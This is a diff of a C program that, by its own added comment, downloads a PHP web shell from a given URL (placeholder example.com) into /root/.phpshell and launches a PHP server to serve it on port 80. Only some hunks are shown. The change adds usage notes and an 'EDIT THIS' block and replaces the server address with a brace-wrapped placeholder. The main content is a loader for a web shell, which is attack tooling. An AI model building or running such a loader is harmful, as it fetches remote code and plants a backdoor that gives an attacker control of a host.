@@ -1,3 +1,13 @@
+/*
+I found this when I was organizing stuff on my hard drive.
+
+Compile with -lcurl
+What does this thing do? It downloads a php shell from provided URL and spawns a php instance. 
+
+DEFAULT DIRECTORY: /root/.phpshell
+Change to suit your needs
+*/
+
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -81,7 +91,7 @@ void spawnphp(const char* phpspawn) {
     if (fp == NULL) {
         /*SHOULD NEVER GET HERE*/
         clr_red();
-        printf("[✘] ERROR SPAWNING PHP\n");
+        printf("[✘] COULD NOT SPAWN PHP\n");
         resetcolor();
         exit(0);
     }
@@ -102,11 +112,15 @@ int main(int argc, char const *argv[])
 
 	isphpdir();
 	/*
+	*****************
+	*** EDIT THIS ***
+	*****************
 	downloader("{URL}","DEST_PATH");
+	spawnphp(); - Replace {127.0.0.1:80}
 	*/
 	downloader("http://example.com/shell","/root/.phpshell/index.php");
 	check_if_index_exists();
-	spawnphp("php -q -S 127.0.0.1:80 -t /root/.phpshell/ > /dev/null 2>&1");
+	spawnphp("php -q -S {127.0.0.1:80} -t /root/.phpshell/ > /dev/null 2>&1");
 	return 0;
 }
 
